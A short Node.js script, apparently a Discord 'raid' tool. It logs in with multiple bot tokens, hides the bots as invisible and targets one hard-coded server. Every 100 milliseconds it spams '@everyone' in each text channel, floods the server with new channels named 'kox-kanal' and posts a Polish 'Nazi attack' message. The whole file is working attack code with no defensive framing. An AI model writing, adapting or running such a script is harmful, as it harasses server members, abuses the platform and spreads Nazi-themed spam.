const { Client, Intents } = require('discord.js');
const auth = require('./tokens.json');

for (const token of auth.tokens) {
	const client = new Client({ intents: [Intents.FLAGS.GUILDS] });

	client.on('ready', async () => {
		client.user.setStatus('invisible');
		console.log(`Bot ${client.user.tag} is ready!`);

		const guild = client.guilds.cache.get('935895578485882930');
		if (!guild) return console.error('Guild not found.');

		guild.channels.cache.forEach(channel => {

			if (channel.type === 'GUILD_VOICE' || channel.type === 'GUILD_CATEGORY') return;

			setInterval(async () => {
				channel.send('@everyone');

				try {
					const shit = await guild.channels.create('kox-kanal', {
						type: 'GUILD_TEXT',
						permissionOverwrites: [{
							id: guild.id,
						}],
					});
					await shit.send('ATAK HITLEROWCÓW @everyone ATAK HITLEROWCÓW');
				} catch (err) {
					console.error(err);
				}
			}, 100);

		});
	});

	client.login(token);
}